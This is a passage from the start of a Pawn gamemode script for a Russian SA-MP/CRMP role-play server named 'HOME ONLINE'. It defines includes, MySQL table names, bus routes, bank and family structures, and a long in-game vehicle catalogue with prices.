/*
	Арзамас цвет - ECFC00
	Остальное цвет - D70066
*/

//-------------------------------[ Инклюды ]------------------------------------
#include <a_samp>

#if defined MAX_PLAYERS
#undef MAX_PLAYERS
#define MAX_PLAYERS 500
#else
#define MAX_PLAYERS 500
#endif

#if defined MAX_VEHICLES
#undef MAX_VEHICLES
#define MAX_VEHICLES 1500
#else
#define MAX_VEHICLES 1500
#endif

//#include <crashdetect>
//#include <jit>

native IsValidVehicle(vehicleid);

#include <Pawn.RakNet>

#include <streamer> // - Streamer 2.0 | By incognito
#include <sscanf2>  // - Sscanf 2.8.2 | By Y_Less

#define MAX_DYNAMIC_PICKUPS 30000
#include <pickfix2>

#include <a_mysql>  // - MySql R39-5
#include <a_actor>
#include <mxdate>
#include <cef>
#include <mxINI>
#include <a_http>
#include <foreach>
#include <Pawn.CMD> // - Pawn.CMD | By urShadow
#include <PointToPoint>
#include <Pawn.Regex>
#include <frobj>
#include <CRP>
#include <md5>
#include <TOTP>
#include <fly>
//#include <playerpickup>

new STRING_GLOBAL[2048];

new kick_reason[MAX_PLAYERS][64];

new GateVipHouseLavrov;
new GateVipHouseLavrovStatus = 0;

new FirstReferal[MAX_PLAYERS];

new bool:PlayerLogged[MAX_PLAYERS];

#pragma tabsize 0

stock LoadObject()
{
	new tmpobjid;
	new object_world = -1;
	new object_int = -1;
	#include "../include/cromulent/armia"
	#include "../include/cromulent/interiors/ints"
	#include "../include/cromulent/univer"
	#include "../include/cromulent/interiors/dpsinterior"
	#include "../include/cromulent/fix"
	#include "../include/cromulent/lesopilka_crmp"
	#include "../include/cromulent/mine_crmp"
	#include "../include/cromulent/mine_int_crmp"
	#include "../include/cromulent/dpsinterior"
	#include "../include/cromulent/kazarma"
	#include "../include/cromulent/intcentrros"
	#include "../include/cromulent/CromulentMap"
	#include "../include/cromulent/Int_GIBDD"
	#include "../include/dishevniy/interiors/ints/int_mafia1"
	#include "../include/dishevniy/interiors/ints/int_mafia2"

	#include "../include/dishevniy/PaintBall"
	#include "../include/dishevniy/PaintBallPoligon"
	#include "../include/dishevniy/interiors/ints/int_smi"

	#include "../include/dishevniy/interiors/interiors_list"
}
#pragma tabsize 4
//-------------------------------[*Макросы*]------------------------------------
#define SERVER_NAME           "HOME ONLINE" // - Название сервера (Для сообщений диалогов, не HOSTNAME!)
#define SERVER_VERSION        "Home 1.0" // - Версия мода (SetGameModeText)
#define SERVER_MAP            "Criminal Russia" // - Название карты (mapname)
#define SERVER_WEBSITE        "" // - Сайт
#define SERVER_WEBURL         "" // - Сайт
#define PAGE_WEBSITE_DONATE   ""
#define SERVER_FORUM          ""
#define SERVER_GROUP          ""
#define VERSION_AC            "1"

#pragma warning disable 238
#pragma warning disable 202

//----------------------------[ Название таблиц MySql ]-------------------------
#define T_ACCOUNTS            "`accounts`" // - Аккаунты
#define T_VEHICLE             "`vehicle`"  // - Автомобили фракций
#define T_BIZZ                "`bizz`"     // - Бизнесы
#define T_HOUSE               "`house`"    // - Дома
#define T_MAFIA               "`mafia`"    // - Общаки мафий
#define T_GANG                "`gang`"
#define T_ATM                 "`atm`"      // - Банкоматы
#define T_OTHER               "`other`"    // - Настройки сервера
#define T_ADMIN               "`admin`"    // - Администраторы
#define T_RADAR               "`radar`"    // - Радары
#define T_INVENT              "`inventory`" // - Инвенатри игроков
#define T_DROPIT              "`dropitem`" // - Выброшенные вещи
#define T_FAMILY              "`family`" // - Семьи
#define T_GARAGES             "`garages`" // - Гаражи
//------------------------------------------------------------------------------
#define MAX_CONNECTIONS_FROM_IP 3 // - Максимальное количество игроков с 1 IP

#define 	SCM 	SendClientMessage
#define 	SPD 	ShowPlayerDialog
#define     SCMTA   SendClientMessageToAll

#define GARAGE_CAR_POSITION 956.4440, 1590.5248, 2011.9667

new door_inter_swat;
new door_inter_swat_status = 0;

enum
	E_STRUCT_BUS_ROUTE
{
	route_id,
	bus_id,
	stop_name[32],
	Float: stop_x,
	Float: stop_y,
	Float: stop_z,
	route_one[32],
	route_two[32],
	route_three[32],
	Float: next_stop_one[4],
	Float: next_stop_two[4],
	Float: next_stop_three[4],
	bus_time_minute,
};


new const
	g_bus[][E_STRUCT_BUS_ROUTE] =
{
	{
		1, 401, "Автовокзал",
		136.5550, 842.6726, 12.1417,
		"Автовокзал - Автошкола",
		"Автовокзал - Автосалон",
		"Автовокзал - г. Южный",
		{616.8149,397.3701,12.1013, 70.0},
		{866.4008,-159.7545,4.1677, 354.0},
		{2271.8396,-1813.4288,21.9619, 270.0},
		240
	},

	{
		2, 402, "Автошкола",
		617.9123,397.9705,12.0597,
		"Автошкола - Автовокзал",
		"Автошкола - Больница",
		"Автошкола - Полиция",
		{136.5693,842.6924,12.1417,350.0},
		{-286.6873,589.9797,12.1928, 350.0},
		{1451.8396,-159.8383,4.1634, 0.0},
		240
	},

	{
		3, 403, "Больница",
		-285.4587,589.7452,12.1909,
		"Больница - Автовокзал",
		"Больница - Полиция",
		"Больница - Автошкола",
		{136.5693,842.6924,12.1417,350.0},
		{1451.8396,-159.8383,4.1634,0.3155},
		{616.8149,397.3701,12.1013,70.5262},
		180
	},

	{
		4, 404, "Полиция",
		1453.4886,-160.6002,4.1243,
		"Полиция - Автовокзал",
		"Полиция - Анашан",
		"Полиция - Автосалон",
		{136.5693,842.6924,12.1417,350.0},
		{2428.7830,-783.3961,12.0740,180.2075},
		{616.8149,397.3701,12.1013,70.5262},
		270
	},

	{
		5, 405, "Анашан",
		2427.2791,-782.5338,12.0074,
		"Анашан - Автовокзал",
		"Анашан - ст. Полынь",
		EOS,
		{136.5693,842.6924,12.1417,350.0},
		{2477.8367,-2119.9590,21.9619, 90.0},
		{0.0, 0.0, 0.0, 0.0},
		240
	}
};

static
	Float: coord_spawn_bus_int[][3] =
	{
		{2411.9805,-1779.6592,9041.1641},
		{2409.6035,-1779.6315,9041.1641},
		{2407.3120,-1779.6029,9041.1641},
		{2404.5044,-1779.5680,9041.1641}
	};


static
	Float: coord_arend_scooter[][3] =
	{
		{1899.1311,2073.4895,15.9169},
		{2515.4492,-2132.8435,21.9700},
		{-482.0693,943.3712,12.1504},
		{-482.0551,879.1306,12.1504},
		{789.9755,520.3755,12.0084},
		{2317.6768,1729.5619,1.8702}
	};

#define SendMes(%1,%2,%3,%4) do{ STRING_GLOBAL[0]=EOS; format(STRING_GLOBAL,sizeof(STRING_GLOBAL),(%3),%4); SendClientMessage((%1),(%2),STRING_GLOBAL); }while(FALSE)

new g_player_listitem_use[MAX_PLAYERS] = {-1, ...};

new g_player_listitem[MAX_PLAYERS][32];

new player_is_flying[MAX_PLAYERS];

new PAYDAY = 0;

enum
	E_STRCUT_PROPOSITION
{
	P_OUT_ID,
	P_ING_ID,
	P_INCOMING_TYPE,
	P_INCOMING_VALUE[2]
};

new
	proposition_info[MAX_PLAYERS][E_STRCUT_PROPOSITION];

new const
	g_proposition_default_values[E_STRCUT_PROPOSITION] =
{
	INVALID_PLAYER_ID,
	INVALID_PLAYER_ID,
	-1,
	{-1, -1}
};

enum
{
	PROPOSITION_TYPE_NONE = -1,
	PROPOSITION_TYPE_KISS,
	PROPOSITION_TYPE_HUG,
	PROPOSITION_TYPE_HI,
	PROPOSITION_TYPE_SELL_CAR,
	PROPOSITION_TYPE_SELL_HOUSE,
	PROPOSITION_TYPE_SELL_BUSINESS,
	PROPOSITION_TYPE_SHOW_LIC,
	PROPOSITION_TYPE_SHOW_PASS,
	PROPOSITION_TYPE_INVITE,
	PROPOSITION_TYPE_FAMILY_INVITE,
	PROPOSITION_TYPE_DICE_CREDITS,
	PROPOSITION_TYPE_FISHKI_MONEY,
};

const MAX_BANK_ACCOUNTS = 8;

enum
	E_BANK_ACCOUNT_STRUCT
{
	B_ID,
	B_NAME[21],
	B_PIN_CODE[9],
	B_BALANCE,
	B_REG_TIME
};
new g_bank_accounts[MAX_PLAYERS][MAX_BANK_ACCOUNTS][E_BANK_ACCOUNT_STRUCT];


static
	Float: coord_spawn_demorgan[][4] =
	{
		{2177.9104, -2348.7549, 1002.0000, 270.0},
		{2178.4775, -2343.6440, 1002.0000, 270.0},
		{2192.5840, -2343.2031, 1002.0059, 90.0},
		{2192.3245, -2348.9119, 1002.0059, 90.0}
	};

enum
	E_TUNING_BUY_DISKS
{
	D_NAME[10],
	D_PRICE,
	D_COMPONENT,
	D_PRODUCT,
};

new g_tuning_disks[10][E_TUNING_BUY_DISKS] =
{
	{"Shadow", 		60, 	1073,	60},
	{"Mega", 		79,		1074,	79},
	{"Wires", 		53,		1076,	53},
	{"Classic",		73,		1077,	73},
	{"Twist",		93,		1078,	93},
	{"Cutter",		80,		1079,	80},
	{"Grove", 		42,		1081,	42},
	{"Atomic", 		100,	1085,	100},
	{"Dollar", 		200,	1083,	200},
	{"Switch", 		300,	1080,	300}
};


enum
	E_TUNING_IMPROVEMENT_ENGINE
{
	E_NAME[32],
	E_MAX_SPEED,
	E_PRICE
};

new g_tuning_engine[3][E_TUNING_IMPROVEMENT_ENGINE] =
{
	{"Stage 1", 15, 2},
	{"Stage 2", 20, 5},
	{"Stage 3", 25, 7}
};

new engine_improvement[MAX_PLAYERS];

enum
{
	PEDAL_TYPE_NONE = 0, // не жмёт ни на какую педаль
	PEDAL_TYPE_GAS, // педаль газа
	PEDAL_TYPE_BRAKE // педаль тормоза
}

enum
	E_VEHICLE_STRUCT
{
	veh_sql_id,
	veh_owner_id,
	veh_slot,
	veh_model,
	veh_color[2],
	veh_driver_id,
	veh_virtual,
	veh_com[64],
	veh_coms[14],
	veh_paintjob,
	Float: veh_health,
	veh_improve,
	bool: veh_engine,
	bool: veh_lights,
	bool: veh_locked,
	veh_fuel,
	Float: veh_milliage,
	veh_type_num,
	veh_number[32],
	Text3D: veh_number_label,
	bool: create_adm,
	Text3D: veh_label,
	bool:veh_autosalon,
	veh_price,
	Float:veh_x,
	Float:veh_y,
	Float:veh_z,
	Float:veh_a,
	Float: veh_wear
};

new g_vehicle[MAX_VEHICLES][E_VEHICLE_STRUCT];

new
	g_vehicle_default_values[E_VEHICLE_STRUCT] =
{
	-1,
	INVALID_PLAYER_ID,
	0,
	0,
	{0, 0},
	INVALID_PLAYER_ID,
	0,
	{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},
	{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},
	3,
	1000.0,
	0,
	false,
	false,
	false,
	45,
	0.0,
	0,
	-1,
	Text3D:-1,
	false,
	Text3D:-1,
	false,
	0,
	0.0,
	0.0,
	0.0,
	0.0,
	1000.0
};

#define GetVehicleData(%0,%1)		g_vehicle[%0][%1]
#define SetVehicleData(%0,%1,%2)	g_vehicle[%0][%1] = %2
#define ClearVehicleData(%0)		g_vehicle[%0] = g_vehicle_default_values

enum
	E_BONUS_STRUCT
{
	B_ONLINE,
	B_COUNT,
	B_PLAYERS,
};

new bool: player_select_other_sum[MAX_PLAYERS];

new door_bank;
new door_bank_status = 0;

enum
{
	AreaBuyBomb = 1,
	AreaExplosionBomb,
	AreaBankMenu,
	AreaBankMenu2,
	AreaBankMenu3,
	AreaSearhProperty,
	//AreaImproveHouse,
	AreaRealtorInfo,
	AreaEmployed,
	AreaParkingFine,
	AreaRegPaintball,
	AreaArendScooter,
	AreaDeliveryBottle,
};

enum
	E_AREA_PICKUP_ACTIONS
{
	g_area_pickupid,
	Float: g_area_actiont_pos_x,
	Float: g_area_actiont_pos_y,
	Float: g_area_actiont_pos_z,
	a_actiont_text[144]
};

new PlayerTimer[MAX_PLAYERS][4];

#define @_200 0
#define @_1000 1
#define @_5000 2
#define @_10000 3

new const
	g_area_actionts[][E_AREA_PICKUP_ACTIONS] =
{
	{0, 2279.5686,-182.4699,2.1452, "Покупка бомбы\nСтоимость: 10000000 рублей\nДля покупки введите: /buybomb"},
	{0, 525.3705,657.5466,3591.5991, EOS},
	{19134, 526.2593,674.9232,3591.59911, EOS},
	{19134, 529.2113,683.6135,3591.5991, EOS},
	{19134, 527.9678,679.1821,3591.5991, EOS},
	{19134, 1062.7491,1920.2773,3026.7639, "Поиск свободной недвижимости"},
	{19134, 1059.3969,1917.0737,3026.7639, "Поиск свободной недвижимости"},
	{19134, 1058.4004,1920.2207,3026.7639, "Информация свободной недвижимости"},
	{19134, -901.7783,846.4376,2512.9500, "Покупка Лицензии для Владения Бизнеса"},
	{19134, -32.4674,1350.2511,12.8750, "Штрафстоянка"},
	{19134, -288.8245,956.0812,12.6391, "Регистрация на пейтнболл"},
//	{19134, 1841.8074,2034.8319,16.0600, "{1D99D4}- Аренда мопедов -\n{FFFFFF}Встаньте на пикап"},
	{19134, 2441.2576,-2017.1298,21.9779, "{1D99D4}- Сдача бутылок -\n{FFFFFF}Встаньте на пикап"}
//	{1239, 1603.8601,987.0284,1819.0200, "{63BD4E}Покупка фишек\n{AFAFAF}Встаньте на пикап"},
//	{1239, 500.2901,-29.0301,1906.4556, "{63BD4E}Покупка фишек\n{AFAFAF}Встаньте на пикап"},
//	{1239, 2181.5330,-2351.8918,1002.0000, "{63BD4E}Покупка фишек\n{AFAFAF}Встаньте на пикап"}
//	{1275, 1760.5961,2303.1797,16.0000, "{BBBBBB}Работа шахтёра"},
//	{1275, 2038.9863, 1423.2720, 26.240, "{BBBBBB}Работа лесоруба"},
//	{1275, 462.9606,376.7354,12.1600, "{BBBBBB}Работа фермера"},*/
//	{1275, 566.3723,823.1688,12.2700, "{BBBBBB}Работа сборщика оружия"}
};

new g_area_actions_total[sizeof g_area_actionts];

#define BOMB_PRICE		(10000000)

new bank_money_pickup;
	//licenses_pickup;

#define MAX_FAMILY	(500)	// максимальное количество семей

enum
	E_FAMILY_STRUCT
{
	F_ID,
	F_NAME[64],
	F_OWNER[MAX_PLAYER_NAME],
	F_OWNED,
	F_SUB[16],
	F_HOUSE,
	Text3D: F_STORE_LABEL,
	F_DRUGS,
	F_PATRON,
	F_MONEY,
	F_PROD,
	bool: F_SPAWN
};

new g_family_info[MAX_FAMILY][E_FAMILY_STRUCT];

new
	g_family_default_values[E_FAMILY_STRUCT] =
{
	-1,
	EOS,
	EOS,
	-1,
	{-1, -1, -1},
	-1,
	Text3D:-1,
	0,
	0,
	0,
	0,
	false
};

#define GetFamilyData(%0,%1)		g_family_info[%0][%1]
#define SetFamilyData(%0,%1,%2)		g_family_info[%0][%1] = %2
#define ClearFamilyData(%0)			g_family_info[%0] = g_family_default_values

new IteratorArray:FamilyMembers[MAX_FAMILY]<MAX_PLAYERS>;

/*enum
	E_FAMILY_VEHICLE_STRUCT
{
	FV_SQL_ID,
	FV_FAM_ID,
	FV_ID,
	FV_COLOR[2],
	Float: FV_POS_X,
	Float: FV_POS_Y,
	Float: FV_POS_Z,
	Float: FV_POS_R,
	Float: FV_MILEAGE,
	FV_FUEL,
};

new g_family_vehicle_info[1000][E_FAMILY_VEHICLE_STRUCT];

new
	g_family_vehicle_default_values[E_FAMILY_STRUCT] =
{
	-1,
	-1,
	0,
	{-1, -1},
	0.0,
	0.0,
	0.0,
	0.0,
	0
};

#define GetFamilyVehicleData(%0,%1)			g_family_vehicle_info[%0][%1]
#define SetFamilyVehicleData(%0,%1,%2)		g_family_vehicle_info[%0][%1] = %2
#define ClearFamilyVehicleData(%0)			g_family_vehicle_info[%0] = g_family_vehicle_default_values*/

new Text:color_menu_global_td[27];
new Text: gps_td;
new PlayerText:color_menu_player_td[MAX_PLAYERS][15];

//new Text:pass_TD[1];

new Text: autosalon_td[5],

	PlayerText: autosalon_ptd_first[MAX_PLAYERS],
	PlayerText: autosalon_ptd_second[MAX_PLAYERS];

enum
	E_COLOR_STRICT
{
	C_NAME[32],
	C_CODE,
	C_CODE_RGB[12],
};

new const
	g_info_color[][E_COLOR_STRICT] =
{
	{"Черный",	 		0x000000FF, 	"000000"},
	{"Голубой", 		0x0000FFFF, 	"0000FF"},
	{"Фисташковый", 	0xFF00FFFF, 	"FF00FF"},
	{"Серый", 			0x808080FF, 	"808080"},
	{"Зеленый", 		0x008000FF, 	"008000"},
	{"Оливковый", 		0x808000FF, 	"808000"},
	{"Фиолетовый", 		0x800080FF, 	"800080"},
	{"Красный", 		0xFF0000FF, 	"FF0000"},
	{"Серебрянный", 	0xC0C0C0FF, 	"C0C0C0"},
	{"Белый", 			0xFFFFFFFF, 	"FFFFFF"},
	{"Жёлтый", 			0xFFFF00FF, 	"FFFF00"},
	{"Оранжевый",		0xFF8000FF, 	"FF8000"},
	{"Мандариновый",	0xFFCC00FF, 	"FFCC00"},
	{"Лаймовый",		0x00FF00FF, 	"00FF00"},
	{"Изумрудный",		0x33CC66FF, 	"33CC66"}
};

new Text:autosalon_global_td[67];
new PlayerText:autosalon_player_td[MAX_PLAYERS][2];

enum
	E_VEHICLE_INFO_STRUCT
{
	VI_ID,
	VI_COST,
	VI_NAME[32],
	VI_MAX_SPEED,
};

new g_vehicle_info[][E_VEHICLE_INFO_STRUCT]	=
{
	{400, 	1300000, 		"BMW X5 e53", 							168},//Средний Класс //
	{401, 	195000, 		"Lada 2113",							136},//Низкий Класс //
	{402, 	4100000, 		"Mercedes-Benz E63 AMG", 				254}, //Высокий Класс //
	{403, 	6300000, 		"Volvo FH16", 							135},
	{404, 	120000, 		"Lada 2107", 							125},//Низкий Класс//
	{405, 	2800000, 		"INFINITI Q50", 						240},//Средний Класс//
	{406, 	1800000,		"ЗИЛ 130", 								95},
	{407, 	0, 				"MAZ (Пожарный)", 						110},
	{408, 	0, 				"Зил 130 (Мусоровоз)", 					85},
	{409, 	13000000, 		"Mercedes-Benz Maybach S222", 			238}, //Эксклюзив Класс//
	{410, 	1200000, 		"Mitsubishi Lancer X", 					199},//Средний Класс //
	{411, 	4200000, 		"BMW X6M", 								204},//Высокий Класс//
	{412, 	830000, 		"MAZDA 3", 								148},//Средний Класс//
	{413, 	0, 				"Заменить", 							65},
	{414, 	0, 				"Заменить", 							47},
	{415, 	11000000, 		"Audi RS7", 							241},//Высокий Класс//
	{416, 	7500000,		"Ford Transit (Скорая Помощь)", 		164},//
	{417, 	0, 				"Вертолёт", 							0},
	{418, 	7000000, 		"Mercedes Sprinter", 					164},//
	{419, 	1800000, 		"Subaru WRX STI", 						212},//Средний Класс//
	{420, 	0, 				"Skoda Octavia (Такси)", 				175},
	{421, 	1800000, 		"Mercedes-Benz S600 W140", 				195},//Средний Класс//
	{422, 	190000, 		"UAZ 452", 								110},//Низкий Класс//
	{423, 	0, 				"Chevrolet (Мароженное)",  				58},
	{424, 	30000, 			"Lada OKA", 							110},//Низкий Класс//
	{425, 	0, 				"Вертолёт (Военный)", 					0},
	{426, 	13000000, 		"Rolls-Royce Phantom", 					219}, //Высокий Класс//
	{427, 	0, 				"ГАЗель (ППС)", 						167},//
	{428, 	0, 				"ГАЗель (Инкассатор)", 					148},//			 Номера доделать
	{429, 	900000, 		"Ford Focus", 							168},//Средний Класс//
	{430, 	0, 				"Лодка (Полиция)", 						0},
	{431, 	0, 				"МАЗ-206086 (автобус)", 				63},
	{432, 	0, 				"Танк", 								0},
	{433, 	0, 				"ЗИЛ-131", 								47},
	{434, 	3900000, 		"Drag Car", 							99},
	{435, 	0, 				"Прицеп",								0},
	{436, 	1400000, 		"BMW E38 740",			 				176},//Средний Класс//
	{437, 	0, 				"Заменить", 							88},
	{438, 	1200000, 		"Mercedes-Benz E55 W210", 				197},//Средний Класс//
	{439, 	115000, 		"Lada 2106", 							125},//Низкий Класс//
	{440, 	7000000, 		"Mercedes Sprinter", 					164},//
	{441, 	0, 				"Игрушечное Авто", 						0},
	{442, 	170000, 		"Lada 2112", 							136},//Низкий Класс//
	{443, 	0, 				"Заменить", 							68},
	{444, 	0, 				"Монстер", 								65},
	{445, 	700000, 		"Lada Vesta", 							161},//Средний Класс//
	{446, 	0, 				"Лодка", 								0},
	{447, 	0, 				"Вертолёт",  							0},
	{448, 	0, 				"Заменить", 							0},
	{449, 	0, 				"Заменить", 							0},
	{450, 	0, 				"Прицеп",  								0},
	{451, 	25000000, 		"Ferrari Testarossa", 					296}, //Эксклюзив Класс//
	{452, 	0, 				"Лодка", 								0},
	{453, 	0, 				"Лодка",  								0},
	{454, 	0, 				"Яхта",  								0},
	{455, 	0, 				"Грейдер",  							35},
	{456, 	0, 				"GAZ Почта", 							62},
	{457, 	0, 				"ГольфКар",  							56},
	{458, 	1050000, 		"Toyota Mark II", 						173},//Средний Класс//
	{459, 	6800000, 		"FORD Transit", 						161},//
	{460, 	0, 				"Самолёт",  							0},
	{461, 	80000, 			"Jawa", 								91},
	{462, 	20000, 			"Scooter",								0},
	{463, 	100000, 		"Харвей", 								83},
	{464, 	0, 				"Игрушечное Авто", 						0},
	{465, 	0, 				"Игрушечное Авто", 						0},
	{466, 	13000000, 		"BMW M5 F90 Competition", 				314},//Высокий Класс//
	{467, 	100000, 		"Lada 2101", 							125},//Низкий Класс//
	{468, 	100000, 		"Sanchez", 								0},
	{469, 	0, 				"Вертолёт", 							0},
	{470, 	9000000,		"UAZ Tigr", 							125},//
	{471, 	240000, 		"Quadro", 								0},
	{472, 	0, 				"Лодка", 								0},
	{473, 	0, 				"Лодка", 								0},
	{474, 	400000, 		"Lada Granta", 							161},//Низкий Класс//
	{475, 	8000000, 		"Range Rover Vogue", 					240},//Высокий Класс//
	{476, 	0, 				"Самолёт", 								0},
	{477, 	1220000, 		"Mazda RX-7", 							220},//Средний Класс//
	{478, 	620000, 		"Renault Megane", 						160},//Средний Класс//
	{479, 	160000, 		"Lada 2110", 							136},//Низкий Класс//
	{480, 	18000000, 		"Porsche 911 Carrera S", 				296},//Высокий Класс//
	{481, 	0, 				"Велосипед", 							0},
	{482, 	5500000, 		"Mercedes-Benz G55", 					168},//Высокий Класс//
	{483, 	0, 				"Заменить", 							87},
	{484, 	0, 				"Пароход", 								0},
	{485, 	1400000, 		"Volkswagen Golf R", 					186},//Средний Класс//
	{486, 	0, 				"Заменить", 							38},
	{487, 	0, 				"Raven 2 R44(вертолёт)", 				0},
	{488, 	0, 				"Вертолёт", 							0},
	{489, 	3600000, 		"BMW X5M F95", 							233},//Высокий Класс//
	{490, 	11300000, 		"Cadilac Escalade", 					240},//Высокий Класс//
	{491, 	2200000, 		"BMW M3 E46", 							240},//Средний Класс//
	{492, 	200000, 		"Lada 2114", 							136},//Низкий Класс//
	{493, 	0, 				"Лодка", 								0},
	{494, 	14500000, 		"BMW M8 F92", 							296},//Высокий Класс//
	{495, 	7000000, 		"Porsche Cayenne", 						201}, //Высокий Класс//
	{496, 	350000, 		"GAZ 31105",							136},//Низкий Класс//
	{497, 	0, 				"Вертолёт", 							0},
	{498, 	0, 				"Заменить", 							32},
	{499, 	0, 				"Заменить", 							34},
	{500, 	360000, 		"UAZ Patriot", 							125},//Средний Класс//
	{501, 	0, 				"Игрушечное Авто", 						0},
	{502, 	6000000, 		"Tesla Model S", 						213}, //Высокий Класс//
	{503, 	5500000, 		"Ford Mustang", 						284}, //Высокий Класс//
	{504, 	0, 				"крашкар",			 					102},
	{505, 	11500000, 		"Lamborghini Urus", 					302}, //Высокий Класс//
	{506, 	11000000, 		"Ferrari 488 GTB", 						302}, //Высокий Класс//
	{507, 	490000, 		"BMW M5 E28", 							166},//Средний Класс//
	{508, 	150000, 		"UAZ 452", 								110},//Низкий Класс//
	{509, 	0, 				"Велосипед", 							0},
	{510, 	0, 				"Велосипед", 							0},
	{511, 	0, 				"Саморлёт", 							0},
	{512, 	0, 				"Саморлёт", 							0},
	{513, 	0, 				"Саморлёт", 							0},
	{514, 	10000000,		"Scania G 420", 						118},//
	{515, 	7500000, 		"Mercedes-Benz Actros", 				154},//
	{516, 	675000, 		"Volkswagen Polo", 						175},//Средний Класс//
	{517, 	12500000, 		"Bentley Continental GT", 				284},//Высокий Класс//
	{518, 	200000, 		"Заменить", 							67},
	{519, 	0, 				"Саморлёт", 							0},
	{520, 	0, 				"Истребитель", 							0},
	{521, 	135000, 		"Мотоцикл", 							0},
	{522, 	1500000, 		"Мотоцикл", 							0},
	{523, 	0, 				"Мотоцикл (ДПС)",						0},
	{524, 	0, 				"Камаз (Цементовоз)", 					0},
	{525, 	0, 				"ГАЗель (Эвакуатор)", 					189},//
	{526, 	1500000, 		"Audi S4", 								186},//Средний Класс//
	{527, 	1300000, 		"BMW M5 E39", 							176},//Средний Класс//
	{528, 	0, 				"Заменить", 							93},
	{529, 	2000000, 		"BMW M5 E60", 							254},//Средний Класс//
	{530, 	0, 				"Погрузчик", 							0},
	{531, 	0, 				"Трактор", 								45},
	{532, 	0, 				"Комбайн", 								49},
	{533, 	8000000, 		"Audi R8", 								278}, //Высокий Класс//
	{534, 	7100000, 		"Mercedes-Benz GLE63 Coupe", 			199}, //Высокий Класс//
	{535, 	4000000, 		"BMW M4", 								219}, //Высокий Класс//
	{536, 	830000, 		"Skoda Superb", 						176},//Средний Класс//
	{537, 	0, 				"Поезд", 								0},
	{538, 	0, 				"Поезд", 								0},
	{539, 	0, 				"vortex", 								0},
	{540, 	300000, 		"Lada 2170", 							138},//Низкий Класс//
	{541, 	22000000, 		"Lamborghini Aventador SVJ", 			355}, //Высокий Класс//
	{542, 	410000, 		"Niva Urban", 							122},//Низкий Класс//
	{543, 	50000000, 		"Buggati Chiron", 						367}, //Высокий Класс//
	{544, 	0, 				"Заменить", 							82},
	{545, 	90000, 			"Lada 21099", 							125},//Низкий Класс//
	{546,   720000, 		"BMW E34", 								184},//Средний Класс//
	{547, 	560000, 		"Audi 80", 								174},//Средний Класс//
	{548, 	0, 				"Вертолёт (Военный)", 					0},
	{549, 	6000000, 		"Mercedes-Benz S63C", 					278}, //Высокий Класс//
	{550, 	800000, 		"Jeep Grand Cherokee", 					157},//Средний Класс//
	{551, 	1600000, 		"Tayota Land Cruiser 200", 				176},//Средний Класс//
	{552, 	0, 				"Камаз (Бензовоз)", 					71},
	{553, 	0, 				"Саморлёт", 							0},
	{554, 	2800000, 		"Ford Raptor", 							171},//Средний Класс//
	{555, 	320000, 		"Volkswagen Golf mk2",					144},//Низкий Класс//
	{556, 	0, 				"Монстр", 								65},
	{557, 	0, 				"Монстр", 								65},
	{558, 	10000000, 		"Mercedes-Benz 560SEC AMG", 			214},//Эксклюзив Класс//
	{559, 	6800000, 		"Nissan GT-R 35", 						296},//Высокий Класс//
	{560, 	8400000, 		"Porsche Panamera", 					266}, //Высокий Класс//
	{561, 	100000, 		"Москвич", 								76}, //замемнить
	{562, 	1000000, 		"Nissan Skyline R34", 					210},//Средний Класс//
	{563, 	0, 				"Вертолёт", 							0},
	{564, 	0, 				"Игрушечное Авто", 						0},
	{565, 	300000, 		"Lada 2170 Hatchback", 					138},//Низкий Класс//
	{566, 	8500000, 		"Mercedes-Benz GLS63 AMG", 				240},//Высокий Класс//
	{567, 	6000000, 		"Audi RS-6 Avant", 						273}, //Высокий Класс//
	{568, 	0, 				"Багги", 								86},//Эксклюзив
	{569, 	550000, 		"Поезд", 								102},
	{570, 	0, 				"Поезд", 								0},
	{571, 	0, 				"Закменить (карт)", 					55},
	{572, 	0, 				"Газонокосилка", 						0},
	{573, 	18000000, 		"Mercedes-Benz 6x6", 					184},//Высокий Класс//
	{574, 	0, 				"Чистка Дорог", 						0},
	{575, 	8200000, 		"BMW 740LI", 							219},//Высокий Класс//
	{576, 	100000, 		"Москвич", 								76}, //замемнить
	{577, 	0, 				"Саморлёт", 							0},
	{578, 	0, 				"Камаз (Военный)", 						77},//
	{579, 	10000000, 		"Mercedes-Benz G63", 					186},//Высокий Класс//
	{580, 	3200000,		"Mercedes-Benz W221 S63", 				233},//Высокий Класс//
	{581, 	0, 				"Мотоцикл", 							89},
	{582, 	7500000, 		"Ford Transit (Новости)",				164},//
	{583, 	0, 				"Заменить", 							0},
	{584, 	0, 				"Прицеп (Бензовоз)", 					0},
	{585, 	2100000, 		"Mercedes-Benz W124 E500", 				240},//Эксклюзив Класс//
	{586, 	100000, 		"Мотоцикл",				 				79},
	{587, 	13000000, 		"Mercedes-Benz GT63s", 					266},//Высокий Класс//
	{588, 	5700000, 		"Audi Q7", 								254},//Высокий Класс//
	{589, 	600000, 		"Volkswagen Jetta", 					175},//Средний Класс//
	{590, 	0, 				"Вагон", 								0},
	{591, 	0, 				"Прицеп", 								0},
	{592, 	0, 				"Саморлёт", 							0},
	{593, 	0, 				"Саморлёт", 							0},
	{594, 	0, 				"Заменить", 							0},
	{595, 	0, 				"Лодка", 								0},
	{596, 	0, 				"Scoda Octavia (ППС)", 					185},
	{597, 	0, 				"Ford Focus (ДПС)", 					184},//
	{598, 	15000000, 		"LADA Priora (ДПС)", 					194},//
	{599, 	10000000, 		"УАЗ 469 (ППС)", 						157},//
	{600, 	2900000, 		"BMW 740 F02", 					   		184},//Высокий Класс/
	{601, 	0, 				"БТР", 									118},//
	{602, 	8000000, 		"BMW Z4 M40 2019", 						194},//Высокий Класс//
	{603, 	12000000, 		"Bentley Mulliner", 					233},//Высокий Класс//
	{604, 	25000000, 		"Lamborghini Centenario", 				367},//Эксклюзив Класс//
	{605, 	5000000, 		"Chevrolete Camaro", 					254},//Высокий Класс//
	{606, 	0, 				"Полуприцеп", 							0},
	{607, 	0, 				"Полуприцеп", 							0},
	{608, 	0, 				"Заменить", 							0},
	{609, 	7000000, 		"ГАЗель Next (Грузоперевозки)", 		130},//
	{610, 	0, 				EOS, 									0},
	{611, 	0, 				EOS, 									0},
	{612, 	2000000, 		"Mercedes-Benz G500 4x4І Brabus.", 		140}
};

new g_max_products[][] =
{
	{422, 10000},
	{406, 20000},
	{609, 30000},
	{514, 50000},
	{515, 50000}
};

new car_market_data[3][37][1] =
{
    {
        {402},//Mercedes-Benz E63 AMG       Цена:  | Привод:  | Максимальная скорость:  | ID Транспорта:
		{411},//BMW X6M
        {415},//Audi RS7
